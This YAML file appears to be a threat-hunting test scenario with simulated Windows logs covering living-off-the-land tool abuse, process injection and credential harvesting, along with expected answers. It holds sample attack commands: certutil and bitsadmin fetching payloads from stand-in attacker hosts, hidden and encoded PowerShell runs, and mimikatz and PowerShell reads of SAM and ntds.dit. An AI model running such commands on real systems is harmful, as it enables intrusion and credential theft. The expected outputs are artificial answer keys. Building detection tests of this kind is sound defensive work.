name: "Advanced Persistent Threat Hunting Scenario"
description: "Hunt for sophisticated APT activities using behavioral analysis and IOCs"
author: "Threat Hunting Team"
version: "1.0"
category: "threat_hunting"

metadata:
  difficulty: "expert"
  estimated_time: "20-30 minutes"
  mitre_tactics: ["persistence", "defense_evasion", "credential_access", "lateral_movement", "collection"]
  tags: ["apt", "steganography", "living_off_the_land", "memory_injection"]

steps:
  - name: "living_off_the_land_detection"
    description: "Identify suspicious use of legitimate system tools"
    analysis_type: "threat_hunting"
    input_data:
      process_events:
        - timestamp: "2024-01-15T09:15:00Z"
          process: "certutil.exe"
          command_line: "certutil.exe -urlcache -split -f http://malicious-site.com/payload.txt C:\\Windows\\Temp\\legitimate.txt"
          parent_process: "cmd.exe"
          user: "domain\\backup_service"
        - timestamp: "2024-01-15T09:16:00Z"
          process: "powershell.exe"
          command_line: "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\legitimate.txt"
          parent_process: "certutil.exe"
          user: "domain\\backup_service"
        - timestamp: "2024-01-15T09:17:00Z"
          process: "wmic.exe"
          command_line: "wmic process call create \"powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==\""
          parent_process: "powershell.exe"
          user: "domain\\backup_service"
        - timestamp: "2024-01-15T09:18:00Z"
          process: "bitsadmin.exe"
          command_line: "bitsadmin.exe /transfer myDownloadJob /download /priority normal http://attacker-c2.com/stage2.dat C:\\ProgramData\\Microsoft\\stage2.dat"
          parent_process: "powershell.exe"
          user: "domain\\backup_service"
      network_connections:
        - timestamp: "2024-01-15T09:15:30Z"
          src_ip: "10.10.10.55"
          dst_ip: "203.0.113.42"
          dst_port: 443
          protocol: "HTTPS"
          process: "certutil.exe"
          domain: "malicious-site.com"
        - timestamp: "2024-01-15T09:18:30Z"
          src_ip: "10.10.10.55"
          dst_ip: "198.51.100.33"
          dst_port: 80
          protocol: "HTTP"
          process: "bitsadmin.exe"
          domain: "attacker-c2.com"
    context:
      hunt_hypothesis: "Legitimate tools being abused for malicious purposes"
      environment: "enterprise_domain"
      monitoring_timeframe: "24_hours"
    expected_output:
      threat_level: "high"
      findings_count: 3
      mitre_techniques: ["T1105", "T1059.001", "T1197"]
      recommendations: ["monitor_lolbins_usage", "restrict_certutil", "analyze_downloaded_files"]

  - name: "memory_injection_hunting"
    description: "Hunt for process injection and memory manipulation techniques"
    analysis_type: "threat_hunting"
    input_data:
      memory_events:
        - timestamp: "2024-01-15T14:22:00Z"
          event_type: "process_access"
          source_process: "svchost.exe"
          target_process: "explorer.exe"
          access_rights: "PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION"
          call_trace: ["ntdll.dll!NtOpenProcess", "kernel32.dll!VirtualAllocEx", "kernel32.dll!WriteProcessMemory"]
        - timestamp: "2024-01-15T14:22:01Z"
          event_type: "image_load"
          process: "explorer.exe"
          image_path: "C:\\Windows\\System32\\unknown_module.dll"
          signed: false
          hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        - timestamp: "2024-01-15T14:22:02Z"
          event_type: "network_connection"
          process: "explorer.exe"
          dst_ip: "192.0.2.100"
          dst_port: 4444
          protocol: "TCP"
          connection_state: "established"
      api_calls:
        - timestamp: "2024-01-15T14:21:58Z"
          process: "svchost.exe"
          api: "NtAllocateVirtualMemory"
          parameters: "BaseAddress=0x0, RegionSize=0x1000, AllocationType=MEM_COMMIT|MEM_RESERVE, Protect=PAGE_EXECUTE_READWRITE"
        - timestamp: "2024-01-15T14:21:59Z"
          process: "svchost.exe"
          api: "NtWriteVirtualMemory"
          parameters: "ProcessHandle=0x123, BaseAddress=0x10000000, Buffer=<shellcode>, NumberOfBytesToWrite=0x500"
      behavioral_indicators:
        - type: "hollowing_detected"
          description: "Process explorer.exe shows signs of process hollowing"
          confidence: 0.85
        - type: "reflective_dll_loading"
          description: "DLL loaded without being on disk"
          confidence: 0.92
    context:
      hunt_hypothesis: "Advanced malware using process injection for evasion"
      target_host: "DC-01"
      user_context: "SYSTEM"
    expected_output:
      threat_level: "critical"
      findings_count: 4
      mitre_techniques: ["T1055.012", "T1055.001", "T1620"]
      recommendations: ["immediate_isolation", "memory_dump_analysis", "hunt_similar_patterns"]

  - name: "credential_harvesting_hunt"
    description: "Detect advanced credential harvesting and lateral movement preparation"
    analysis_type: "threat_hunting"
    input_data:
      file_access_events:
        - timestamp: "2024-01-15T16:30:00Z"
          process: "lsass.exe"
          file_path: "C:\\Windows\\System32\\config\\SAM"
          access_type: "read"
          bytes_read: 32768
          user: "NT AUTHORITY\\SYSTEM"
        - timestamp: "2024-01-15T16:30:01Z"
          process: "mimikatz.exe"
          file_path: "C:\\Windows\\System32\\config\\SECURITY"
          access_type: "read"
          bytes_read: 65536
          user: "domain\\compromised_admin"
        - timestamp: "2024-01-15T16:30:05Z"
          process: "powershell.exe"
          file_path: "C:\\Windows\\NTDS\\ntds.dit"
          access_type: "read"
          bytes_read: 1048576
          user: "domain\\backup_service"
      registry_access:
        - timestamp: "2024-01-15T16:29:55Z"
          process: "reg.exe"
          key: "HKLM\\SAM\\SAM\\Domains\\Account\\Users\\000001F4"
          access_type: "read"
          user: "domain\\compromised_admin"
        - timestamp: "2024-01-15T16:29:56Z"
          process: "powershell.exe"
          key: "HKLM\\SECURITY\\Policy\\Secrets"
          access_type: "read"
          user: "domain\\backup_service"
      unusual_authentication:
        - timestamp: "2024-01-15T16:35:00Z"
          event_type: "kerberos_ticket_request"
          user: "domain\\service_account"
          service: "HOST/fileserver.domain.com"
          encryption_type: "RC4-HMAC"
          source_ip: "10.10.10.55"
        - timestamp: "2024-01-15T16:35:30Z"
          event_type: "ntlm_authentication"
          user: "domain\\service_account"
          target_system: "EXCHANGE-01"
          source_ip: "10.10.10.55"
          auth_package: "NTLM"
      steganography_indicators:
        - timestamp: "2024-01-15T16:40:00Z"
          file_path: "C:\\Users\\Public\\Documents\\vacation_photo.jpg"
          file_size: 2548736
          entropy: 7.8
          embedded_data_detected: true
          extraction_tool: "steghide"
    context:
      hunt_hypothesis: "APT group preparing for domain compromise and data exfiltration"
      domain_controller: "DC-01"
      compromise_timeline: "3_hours"
    expected_output:
      threat_level: "critical"
      findings_count: 5
      mitre_techniques: ["T1003.001", "T1003.002", "T1003.003", "T1558.003", "T1027.003"]
      recommendations: ["emergency_response", "reset_all_credentials", "analyze_steganographic_files", "hunt_additional_compromises"]